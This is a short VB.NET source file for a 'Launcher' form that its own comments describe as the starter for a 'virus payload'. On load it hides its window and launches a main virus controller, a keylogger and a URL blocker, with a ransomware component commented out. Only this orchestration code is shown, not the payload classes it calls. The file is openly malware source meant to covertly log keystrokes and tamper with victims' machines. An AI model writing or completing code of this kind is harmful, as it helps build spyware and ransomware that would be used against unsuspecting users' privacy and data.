Public Class Launcher

    'This is the Launcher
    'This is the form tha opens all the other forms and implements librarys to start the virus payload and security features
    'virusController contains the first part of the virus
    Private Sub Launcher_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim virusController As New mainVirus()
        Dim keylogger As New KeyLogger()
        Dim BlockURLS As New BlockURLS()
        ' Dim ransomeware As New RansomeWare()

        Me.Hide()
        Me.Visible = False

        virusController.Show()
        BlockURLS.Show()
        keylogger.Show()
        'ransomeware.Show()
    End Sub

End Class